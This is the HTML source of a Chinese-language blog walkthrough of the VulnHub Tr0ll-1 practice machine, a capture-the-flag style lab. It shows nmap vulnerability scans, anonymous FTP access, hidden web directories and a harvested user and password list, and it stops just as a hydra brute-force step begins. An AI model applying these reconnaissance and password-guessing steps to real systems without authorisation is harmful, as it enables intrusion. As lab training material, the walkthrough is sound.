@@ -1,0 +1,561 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+<meta name="viewport" content="width=device-width">
+<meta name="theme-color" content="#222" media="(prefers-color-scheme: light)">
+<meta name="theme-color" content="#222" media="(prefers-color-scheme: dark)"><meta name="generator" content="Hexo 6.3.0">
+
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png">
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png">
+  <link rel="mask-icon" href="/images/logo.svg" color="#222">
+
+<link rel="stylesheet" href="/css/main.css">
+
+
+
+<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.3.0/css/all.min.css" integrity="sha256-/4UQcSmErDzPCMAiuOiWPVVsNN2s3ZY/NsmXNcj0IFc=" crossorigin="anonymous">
+  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/animate.css/3.1.1/animate.min.css" integrity="sha256-PR7ttpcvz8qrF57fur/yAx1qXMFJeJFiA6pSzWi0OIE=" crossorigin="anonymous">
+  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/pace/1.2.4/themes/blue/pace-theme-minimal.css">
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/pace/1.2.4/pace.min.js" integrity="sha256-gqd7YTjg/BtfqWSwsJOvndl0Bxc8gFImLEkXQT8+qj0=" crossorigin="anonymous"></script>
+
+<script class="next-config" data-name="main" type="application/json">{"hostname":"fdlucifer.github.io","root":"/","images":"/images","scheme":"Muse","darkmode":true,"version":"8.15.0","exturl":true,"sidebar":{"position":"left","display":"post","padding":18,"offset":12},"copycode":{"enable":true,"style":"mac"},"bookmark":{"enable":true,"color":"#222","save":"auto"},"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"stickytabs":false,"motion":{"enable":true,"async":true,"transition":{"menu_item":"fadeInDown","post_block":"fadeIn","post_header":"fadeInDown","post_body":"fadeInDown","coll_header":"fadeInLeft","sidebar":"fadeInUp"}},"prism":false,"i18n":{"placeholder":"Searching...","empty":"We didn't find any results for the search: ${query}","hits_time":"${hits} results found in ${time} ms","hits":"${hits} results found"}}</script><script src="/js/config.js"></script>
+
+    <meta name="description" content="名称名称：Tr0ll: 1发布日期：2014年8月14日 下载 Download: http:&#x2F;&#x2F;overflowsecurity.com&#x2F;files&#x2F;Tr0ll.rar Download (Mirror): https:&#x2F;&#x2F;download.vulnhub.com&#x2F;tr0ll&#x2F;Tr0ll.rar Download (Torrent): https:&#x2F;&#x2F;download.vulnhub.com&#x2F;t">
+<meta property="og:type" content="article">
+<meta property="og:title" content="vulnhub靶机渗透[Tr0ll-1]">
+<meta property="og:url" content="https://fdlucifer.github.io/2020/03/31/Tr0ll-1/index.html">
+<meta property="og:site_name" content="lUc1f3r11&#39;s blog">
+<meta property="og:description" content="名称名称：Tr0ll: 1发布日期：2014年8月14日 下载 Download: http:&#x2F;&#x2F;overflowsecurity.com&#x2F;files&#x2F;Tr0ll.rar Download (Mirror): https:&#x2F;&#x2F;download.vulnhub.com&#x2F;tr0ll&#x2F;Tr0ll.rar Download (Torrent): https:&#x2F;&#x2F;download.vulnhub.com&#x2F;t">
+<meta property="og:locale" content="en_US">
+<meta property="og:image" content="https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/vulnhub230.jpg">
+<meta property="og:image" content="https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/vulnhub231.jpg">
+<meta property="og:image" content="https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/vulnhub232.jpg">
+<meta property="og:image" content="https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/haha.jpg">
+<meta property="article:published_time" content="2020-03-31T06:41:57.000Z">
+<meta property="article:modified_time" content="2020-08-16T16:59:26.151Z">
+<meta property="article:author" content="lUc1f3r11">
+<meta property="article:tag" content="vulnhub靶机练习">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/vulnhub230.jpg">
+
+
+<link rel="canonical" href="https://fdlucifer.github.io/2020/03/31/Tr0ll-1/">
+
+
+
+<script class="next-config" data-name="page" type="application/json">{"sidebar":"","isHome":false,"isPost":true,"lang":"en","comments":true,"permalink":"https://fdlucifer.github.io/2020/03/31/Tr0ll-1/","path":"2020/03/31/Tr0ll-1/","title":"vulnhub靶机渗透[Tr0ll-1]"}</script>
+
+<script class="next-config" data-name="calendar" type="application/json">""</script>
+<title>vulnhub靶机渗透[Tr0ll-1] | lUc1f3r11's blog</title>
+  
+
+
+
+
+
+
+
+
+  <noscript>
+    <link rel="stylesheet" href="/css/noscript.css">
+  </noscript>
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage" class="use-motion">
+  <div class="headband"></div>
+
+  <main class="main">
+    <div class="column">
+      <header class="header" itemscope itemtype="http://schema.org/WPHeader"><div class="site-brand-container">
+  <div class="site-nav-toggle">
+    <div class="toggle" aria-label="Toggle navigation bar" role="button">
+        <span class="toggle-line"></span>
+        <span class="toggle-line"></span>
+        <span class="toggle-line"></span>
+    </div>
+  </div>
+
+  <div class="site-meta">
+
+    <a href="/" class="brand" rel="start">
+      <i class="logo-line"></i>
+      <p class="site-title">lUc1f3r11's blog</p>
+      <i class="logo-line"></i>
+    </a>
+      <p class="site-subtitle" itemprop="description">by lUc1f3r11</p>
+  </div>
+
+  <div class="site-nav-right">
+    <div class="toggle popup-trigger" aria-label="Search" role="button">
+    </div>
+  </div>
+</div>
+
+
+
+<nav class="site-nav">
+  <ul class="main-menu menu"><li class="menu-item menu-item-home"><a href="/" rel="section"><i class="fa fa-home fa-fw"></i>Home</a></li><li class="menu-item menu-item-about"><a href="/about/" rel="section"><i class="fa fa-user fa-fw"></i>About</a></li><li class="menu-item menu-item-tags"><a href="/tags/" rel="section"><i class="fa fa-tags fa-fw"></i>Tags<span class="badge">42</span></a></li><li class="menu-item menu-item-categories"><a href="/categories/" rel="section"><i class="fa fa-th fa-fw"></i>Categories<span class="badge">32</span></a></li><li class="menu-item menu-item-archives"><a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>Archives<span class="badge">203</span></a></li><li class="menu-item menu-item-schedule"><a href="/schedule/" rel="section"><i class="fa fa-calendar fa-fw"></i>Schedule</a></li><li class="menu-item menu-item-sitemap"><a href="/sitemap.xml" rel="section"><i class="fa fa-sitemap fa-fw"></i>Sitemap</a></li><li class="menu-item menu-item-commonweal"><a href="/404/" rel="section"><i class="fa fa-heartbeat fa-fw"></i>Commonweal 404</a></li>
+  </ul>
+</nav>
+
+
+
+
+</header>
+        
+  
+  <aside class="sidebar">
+
+    <div class="sidebar-inner sidebar-nav-active sidebar-toc-active">
+      <ul class="sidebar-nav">
+        <li class="sidebar-nav-toc">
+          Table of Contents
+        </li>
+        <li class="sidebar-nav-overview">
+          Overview
+        </li>
+      </ul>
+
+      <div class="sidebar-panel-container">
+        <!--noindex-->
+        <div class="post-toc-wrap sidebar-panel">
+            <div class="post-toc animated"><ol class="nav"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%90%8D%E7%A7%B0"><span class="nav-number">1.</span> <span class="nav-text">名称</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E4%B8%8B%E8%BD%BD"><span class="nav-number">2.</span> <span class="nav-text">下载</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%8F%8F%E8%BF%B0"><span class="nav-number">3.</span> <span class="nav-text">描述</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86"><span class="nav-number">4.</span> <span class="nav-text">信息收集</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#x2F-0x0856BF-x2F-good-luck-x2F-%E7%9B%AE%E5%BD%95"><span class="nav-number"></span> <span class="nav-text">&#x2F;0x0856BF&#x2F;good_luck&#x2F;目录</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#x2F-0x0856BF-x2F-this-folder-contains-the-password-x2F-%E7%9B%AE%E5%BD%95"><span class="nav-number"></span> <span class="nav-text">&#x2F;0x0856BF&#x2F;this_folder_contains_the_password&#x2F;目录</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%88%A9%E7%94%A8"><span class="nav-number">1.</span> <span class="nav-text">利用</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%8F%90%E6%9D%83"><span class="nav-number">2.</span> <span class="nav-text">提权</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%8F%90%E6%9D%832"><span class="nav-number">3.</span> <span class="nav-text">提权2</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E7%9F%A5%E8%AF%86%E7%82%B9%E6%80%BB%E7%BB%93"><span class="nav-number">4.</span> <span class="nav-text">知识点总结</span></a></li></ol></div>
+        </div>
+        <!--/noindex-->
+
+        <div class="site-overview-wrap sidebar-panel">
+          <div class="site-author animated" itemprop="author" itemscope itemtype="http://schema.org/Person">
+    <img class="site-author-image" itemprop="image" alt="lUc1f3r11"
+      src="/images/lucifer11.jpg">
+  <p class="site-author-name" itemprop="name">lUc1f3r11</p>
+  <div class="site-description" itemprop="description">All things about infosec & ctf</div>
+</div>
+<div class="site-state-wrap animated">
+  <nav class="site-state">
+      <div class="site-state-item site-state-posts">
+        <a href="/archives/">
+          <span class="site-state-item-count">203</span>
+          <span class="site-state-item-name">posts</span>
+        </a>
+      </div>
+      <div class="site-state-item site-state-categories">
+          <a href="/categories/">
+        <span class="site-state-item-count">32</span>
+        <span class="site-state-item-name">categories</span></a>
+      </div>
+      <div class="site-state-item site-state-tags">
+          <a href="/tags/">
+        <span class="site-state-item-count">42</span>
+        <span class="site-state-item-name">tags</span></a>
+      </div>
+  </nav>
+</div>
+  <div class="links-of-author animated">
+      <span class="links-of-author-item">
+        <span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL0ZEbHVjaWZlcg==" title="GitHub → https:&#x2F;&#x2F;github.com&#x2F;FDlucifer"><i class="fab fa-github fa-fw"></i>GitHub</span>
+      </span>
+      <span class="links-of-author-item">
+        <span class="exturl" data-url="bWFpbHRvOjExODUxNTE4NjdAcXEuY29t" title="E-Mail → mailto:1185151867@qq.com"><i class="fa fa-envelope fa-fw"></i>E-Mail</span>
+      </span>
+      <span class="links-of-author-item">
+        <span class="exturl" data-url="aHR0cHM6Ly90d2l0dGVyLmNvbS9mZGx1Y2lmZXIxMQ==" title="Twitter → https:&#x2F;&#x2F;twitter.com&#x2F;fdlucifer11"><i class="fab fa-twitter fa-fw"></i>Twitter</span>
+      </span>
+      <span class="links-of-author-item">
+        <span class="exturl" data-url="aHR0cHM6Ly93d3cuZmFjZWJvb2suY29tL3Byb2ZpbGUucGhwP2lkPTEwMDAxOTY5NDUyODYyMA==" title="FB Page → https:&#x2F;&#x2F;www.facebook.com&#x2F;profile.php?id&#x3D;100019694528620"><i class="fab fa-facebook fa-fw"></i>FB Page</span>
+      </span>
+      <span class="links-of-author-item">
+        <span class="exturl" data-url="aHR0cHM6Ly93d3cueW91dHViZS5jb20vY2hhbm5lbC9VQ19saVRlaDRSMUZNYnBWeGxwTWUtdnc=" title="YouTube → https:&#x2F;&#x2F;www.youtube.com&#x2F;channel&#x2F;UC_liTeh4R1FMbpVxlpMe-vw"><i class="fab fa-youtube fa-fw"></i>YouTube</span>
+      </span>
+      <span class="links-of-author-item">
+        <span class="exturl" data-url="aHR0cHM6Ly93d3cuaW5zdGFncmFtLmNvbS95YW5nODkyOS8=" title="Instagram → https:&#x2F;&#x2F;www.instagram.com&#x2F;yang8929&#x2F;"><i class="fab fa-instagram fa-fw"></i>Instagram</span>
+      </span>
+      <span class="links-of-author-item">
+        <span class="exturl" data-url="aHR0cHM6Ly9pbmZvc2VjLmV4Y2hhbmdlL0BsVWMxZjNyMTE=" title="infosec.exchange → https:&#x2F;&#x2F;infosec.exchange&#x2F;@lUc1f3r11"><i class="custom mastodon fa-fw"></i>infosec.exchange</span>
+      </span>
+  </div>
+  <div class="cc-license animated" itemprop="license">
+    <span class="exturl cc-opacity" data-url="aHR0cHM6Ly9jcmVhdGl2ZWNvbW1vbnMub3JnL2xpY2Vuc2VzL2J5LW5jLXNhLzQuMC9kZWVkLnpo"><img src="https://cdnjs.cloudflare.com/ajax/libs/creativecommons-vocabulary/2020.11.3/assets/license_badges/big/by_nc_sa.svg" alt="Creative Commons"></span>
+  </div>
+
+        </div>
+      </div>
+        <div class="back-to-top animated" role="button" aria-label="Back to top">
+          <i class="fa fa-arrow-up"></i>
+          <span>0%</span>
+        </div>
+    </div>
+
+    
+    <div class="sidebar-inner sidebar-blogroll">
+      <div class="links-of-blogroll animated">
+        <div class="links-of-blogroll-title"><i class="fa fa-globe fa-fw"></i>
+          Links
+        </div>
+        <ul class="links-of-blogroll-list">
+            <li class="links-of-blogroll-item">
+              <span class="exturl" data-url="aHR0cHM6Ly9hdHN1ZDAubWUv" title="https:&#x2F;&#x2F;atsud0.me&#x2F;">atsud0</span>
+            </li>
+            <li class="links-of-blogroll-item">
+              <span class="exturl" data-url="aHR0cHM6Ly9kcm9pZGthbGkuZ2l0aHViLmlvLw==" title="https:&#x2F;&#x2F;droidkali.github.io&#x2F;">记忆里的纯真</span>
+            </li>
+            <li class="links-of-blogroll-item">
+              <span class="exturl" data-url="aHR0cHM6Ly94aWFvbGltYXJzLndvcmRwcmVzcy5jb20v" title="https:&#x2F;&#x2F;xiaolimars.wordpress.com&#x2F;">小离</span>
+            </li>
+        </ul>
+      </div>
+    </div>
+  </aside>
+
+
+    </div>
+
+    <div class="main-inner post posts-expand">
+
+
+  
+
+
+<div class="post-block">
+  
+  
+
+  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="en">
+    <link itemprop="mainEntityOfPage" href="https://fdlucifer.github.io/2020/03/31/Tr0ll-1/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/lucifer11.jpg">
+      <meta itemprop="name" content="lUc1f3r11">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="lUc1f3r11's blog">
+      <meta itemprop="description" content="All things about infosec & ctf">
+    </span>
+
+    <span hidden itemprop="post" itemscope itemtype="http://schema.org/CreativeWork">
+      <meta itemprop="name" content="vulnhub靶机渗透[Tr0ll-1] | lUc1f3r11's blog">
+      <meta itemprop="description" content="">
+    </span>
+      <header class="post-header">
+        <h1 class="post-title" itemprop="name headline">
+          vulnhub靶机渗透[Tr0ll-1]
+        </h1>
+
+        <div class="post-meta-container">
+          <div class="post-meta">
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-calendar"></i>
+      </span>
+      <span class="post-meta-item-text">Posted on</span>
+
+      <time title="Created: 2020-03-31 14:41:57" itemprop="dateCreated datePublished" datetime="2020-03-31T14:41:57+08:00">2020-03-31</time>
+    </span>
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-calendar-check"></i>
+      </span>
+      <span class="post-meta-item-text">Edited on</span>
+      <time title="Modified: 2020-08-17 00:59:26" itemprop="dateModified" datetime="2020-08-17T00:59:26+08:00">2020-08-17</time>
+    </span>
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-folder"></i>
+      </span>
+      <span class="post-meta-item-text">In</span>
+        <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+          <a href="/categories/vulnhub-walkthrough/" itemprop="url" rel="index"><span itemprop="name">vulnhub walkthrough</span></a>
+        </span>
+    </span>
+
+  
+</div>
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+        <h3 id="名称"><a href="#名称" class="headerlink" title="名称"></a>名称</h3><p>名称：Tr0ll: 1<br>发布日期：2014年8月14日</p>
+<h3 id="下载"><a href="#下载" class="headerlink" title="下载"></a>下载</h3><ul>
+<li>Download: <span class="exturl" data-url="aHR0cDovL292ZXJmbG93c2VjdXJpdHkuY29tL2ZpbGVzL1RyMGxsLnJhcg==">http://overflowsecurity.com/files/Tr0ll.rar<i class="fa fa-external-link-alt"></i></span></li>
+<li>Download (Mirror): <span class="exturl" data-url="aHR0cHM6Ly9kb3dubG9hZC52dWxuaHViLmNvbS90cjBsbC9UcjBsbC5yYXI=">https://download.vulnhub.com/tr0ll/Tr0ll.rar<i class="fa fa-external-link-alt"></i></span></li>
+<li>Download (Torrent): <span class="exturl" data-url="aHR0cHM6Ly9kb3dubG9hZC52dWxuaHViLmNvbS90cjBsbC9UcjBsbC5yYXIudG9ycmVudA==">https://download.vulnhub.com/tr0ll/Tr0ll.rar.torrent<i class="fa fa-external-link-alt"></i></span></li>
+</ul>
+<span id="more"></span>
+
+<h3 id="描述"><a href="#描述" class="headerlink" title="描述"></a>描述</h3><p>Tr0ll的灵感来自OSCP实验室中不断摇曳的机器。目标很简单，获得root权限并从&#x2F; root目录获取Proof.txt。不为容易受挫！公平警告，前方有巨魔！难度：初学者类型：boot2root</p>
+<p>特别感谢@ OS_Eagle11和@superkojiman自始至终经历了测试！本机应使用DHCP提取IP，如果有任何问题，请与我联系以获取密码以使其正常工作。反馈总是很感激！male</p>
+<p>Freenode-Maleus</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">MD5SUM (Tr0ll.rar): 318fe0b1c0dd4fa0a8dca43edace8b20</span><br></pre></td></tr></table></figure>
+
+<h3 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h3><p>上nmap</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">root@kali:~<span class="comment"># nmap -sV -p- -v 192.168.66.15</span></span><br><span class="line">PORT   STATE SERVICE VERSION</span><br><span class="line">21/tcp open  ftp     vsftpd 3.0.2</span><br><span class="line">22/tcp open  ssh     OpenSSH 6.6.1p1 Ubuntu 2ubuntu2 (Ubuntu Linux; protocol 2.0)</span><br><span class="line">80/tcp open  http    Apache httpd 2.4.7 ((Ubuntu))</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br></pre></td><td class="code"><pre><span class="line">root@kali:~<span class="comment"># nmap -A -p 21,22,80 -v 192.168.66.15 --script=vuln -T4</span></span><br><span class="line">PORT   STATE SERVICE VERSION</span><br><span class="line">21/tcp open  ftp     vsftpd 3.0.2</span><br><span class="line">|_clamav-<span class="built_in">exec</span>: ERROR: Script execution failed (use -d to debug)</span><br><span class="line">|_sslv2-drown: </span><br><span class="line">22/tcp open  ssh     OpenSSH 6.6.1p1 Ubuntu 2ubuntu2 (Ubuntu Linux; protocol 2.0)</span><br><span class="line">|_clamav-<span class="built_in">exec</span>: ERROR: Script execution failed (use -d to debug)</span><br><span class="line">80/tcp open  http    Apache httpd 2.4.7 ((Ubuntu))</span><br><span class="line">|_clamav-<span class="built_in">exec</span>: ERROR: Script execution failed (use -d to debug)</span><br><span class="line">|_http-csrf: Couldn<span class="string">&#x27;t find any CSRF vulnerabilities.</span></span><br><span class="line"><span class="string">|_http-dombased-xss: Couldn&#x27;</span>t find any DOM based XSS.</span><br><span class="line">| http-enum: </span><br><span class="line">|   /robots.txt: Robots file</span><br><span class="line">|_  /secret/: Potentially interesting folder</span><br><span class="line">|_http-server-header: Apache/2.4.7 (Ubuntu)</span><br><span class="line">| http-slowloris-check: </span><br><span class="line">|   VULNERABLE:</span><br><span class="line">|   Slowloris DOS attack</span><br><span class="line">|     State: LIKELY VULNERABLE</span><br><span class="line">|     IDs:  CVE:CVE-2007-6750</span><br><span class="line">|       Slowloris tries to keep many connections to the target web server open and hold</span><br><span class="line">|       them open as long as possible.  It accomplishes this by opening connections to</span><br><span class="line">|       the target web server and sending a partial request. By doing so, it starves</span><br><span class="line">|       the http server<span class="string">&#x27;s resources causing Denial Of Service.</span></span><br><span class="line"><span class="string">|       </span></span><br><span class="line"><span class="string">|     Disclosure date: 2009-09-17</span></span><br><span class="line"><span class="string">|     References:</span></span><br><span class="line"><span class="string">|       http://ha.ckers.org/slowloris/</span></span><br><span class="line"><span class="string">|_      https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2007-6750</span></span><br><span class="line"><span class="string">|_http-stored-xss: Couldn&#x27;</span>t find any stored XSS vulnerabilities.</span><br><span class="line">| vulners: </span><br><span class="line">|   cpe:/a:apache:http_server:2.4.7: </span><br><span class="line">|       CVE-2017-7679   7.5     https://vulners.com/cve/CVE-2017-7679</span><br><span class="line">|       CVE-2018-1312   6.8     https://vulners.com/cve/CVE-2018-1312</span><br><span class="line">|       CVE-2017-15715  6.8     https://vulners.com/cve/CVE-2017-15715</span><br><span class="line">|       CVE-2014-0226   6.8     https://vulners.com/cve/CVE-2014-0226</span><br><span class="line">|       CVE-2017-9788   6.4     https://vulners.com/cve/CVE-2017-9788</span><br><span class="line">|       CVE-2019-0217   6.0     https://vulners.com/cve/CVE-2019-0217</span><br><span class="line">|       CVE-2019-10098  5.8     https://vulners.com/cve/CVE-2019-10098</span><br><span class="line">|       CVE-2019-0220   5.0     https://vulners.com/cve/CVE-2019-0220</span><br><span class="line">|       CVE-2018-17199  5.0     https://vulners.com/cve/CVE-2018-17199</span><br><span class="line">|       CVE-2017-9798   5.0     https://vulners.com/cve/CVE-2017-9798</span><br><span class="line">|       CVE-2017-15710  5.0     https://vulners.com/cve/CVE-2017-15710</span><br><span class="line">|       CVE-2016-8743   5.0     https://vulners.com/cve/CVE-2016-8743</span><br><span class="line">|       CVE-2016-2161   5.0     https://vulners.com/cve/CVE-2016-2161</span><br><span class="line">|       CVE-2016-0736   5.0     https://vulners.com/cve/CVE-2016-0736</span><br><span class="line">|       CVE-2014-3523   5.0     https://vulners.com/cve/CVE-2014-3523</span><br><span class="line">|       CVE-2014-0231   5.0     https://vulners.com/cve/CVE-2014-0231</span><br><span class="line">|       CVE-2019-10092  4.3     https://vulners.com/cve/CVE-2019-10092</span><br><span class="line">|       CVE-2016-4975   4.3     https://vulners.com/cve/CVE-2016-4975</span><br><span class="line">|       CVE-2015-3185   4.3     https://vulners.com/cve/CVE-2015-3185</span><br><span class="line">|       CVE-2014-8109   4.3     https://vulners.com/cve/CVE-2014-8109</span><br><span class="line">|       CVE-2014-0118   4.3     https://vulners.com/cve/CVE-2014-0118</span><br><span class="line">|       CVE-2014-0117   4.3     https://vulners.com/cve/CVE-2014-0117</span><br><span class="line">|       CVE-2018-1283   3.5     https://vulners.com/cve/CVE-2018-1283</span><br><span class="line">|_      CVE-2016-8612   3.3     https://vulners.com/cve/CVE-2016-8612</span><br></pre></td></tr></table></figure>
+
+<p>通过枚举，得到了一些有趣的东西：</p>
+<ul>
+<li>允许匿名FTP登录</li>
+<li>HTTP服务有2个有趣的页面：robots.txt和secret</li>
+</ul>
+<p>允许匿名FTP</p>
+<p>有一个文件lol.pcap，发现一些文本文件名secret_stuff.txt被推送到FTP服务器。该文件包含文本：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">150 Here comes the directory listing.</span><br><span class="line"></span><br><span class="line">-rw-r--r--    1 0        0             147 Aug 10 00:38 secret_stuff.txt</span><br><span class="line"></span><br><span class="line">Well, well, well, aren<span class="string">&#x27;t you just a clever little devil, you almost found the sup3rs3cr3tdirlol :-P</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">Sucks, you were so close... gotta TRY HARDER!</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">150 Opening BINARY mode data connection for secret_stuff.txt (147 bytes).</span></span><br></pre></td></tr></table></figure>
+
+<p>发现在具有该路径的Web服务器中没有什么有用的。回到从PCAP文件获得的文本文件中的消息。注意到sup3rs3cr3tdirlol一直是supersecretdirlol的代名词，然后检查了它是否可以是HTTP服务的URL路径。发现&#x2F;sup3rs3cr3tdirlol&#x2F;存在并且包含一个文件。</p>
+<ul>
+<li><img src="https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/vulnhub230.jpg"></li>
+</ul>
+<p>检查一下文件类型，发现是一个二进制文件。尝试执行它。</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">root@kali:~/vulnhub/troll<span class="comment"># file roflmao</span></span><br><span class="line">roflmao: ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), dynamically linked, interpreter /lib/ld-linux.so.2, <span class="keyword">for</span> GNU/Linux 2.6.24, BuildID[sha1]=5e14420eaa59e599c2f508490483d959f3d2cf4f, not stripped</span><br></pre></td></tr></table></figure>
+
+<p>不用逆向二进制文件，因为当二进制文件运行时，没有内存地址0x0856BF。所以尝试再次使用0x0856BF作为HTTP服务中的URL路径。</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">root@kali:~/vulnhub/troll<span class="comment"># ./roflmao </span></span><br><span class="line">Find address 0x0856BF to proceedr</span><br></pre></td></tr></table></figure>
+
+<p>发现2个web目录</p>
+<ul>
+<li><img src="https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/vulnhub231.jpg"></li>
+</ul>
+<h2 id="x2F-0x0856BF-x2F-good-luck-x2F-目录"><a href="#x2F-0x0856BF-x2F-good-luck-x2F-目录" class="headerlink" title="&#x2F;0x0856BF&#x2F;good_luck&#x2F;目录"></a>&#x2F;0x0856BF&#x2F;good_luck&#x2F;目录</h2><p>which_one_lol.txt<br>包含以下的字段</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">maleus</span><br><span class="line">ps-aux</span><br><span class="line">felux</span><br><span class="line">Eagle11</span><br><span class="line">genphlux &lt; -- Definitely not this one</span><br><span class="line">usmc8892</span><br><span class="line">blawrg</span><br><span class="line">wytshadow</span><br><span class="line">vis1t0r</span><br><span class="line">overflow</span><br></pre></td></tr></table></figure>
+
+<h2 id="x2F-0x0856BF-x2F-this-folder-contains-the-password-x2F-目录"><a href="#x2F-0x0856BF-x2F-this-folder-contains-the-password-x2F-目录" class="headerlink" title="&#x2F;0x0856BF&#x2F;this_folder_contains_the_password&#x2F;目录"></a>&#x2F;0x0856BF&#x2F;this_folder_contains_the_password&#x2F;目录</h2><p>Pass.txt<br>包含以下的字段</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Good_job_:)</span><br></pre></td></tr></table></figure>
+
+<h3 id="利用"><a href="#利用" class="headerlink" title="利用"></a>利用</h3><p>这些文件可能是2个用户或密码。首先，将第一个文件用作用户列表，将第二个文件用作密码。<br>使用hydra爆破</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span 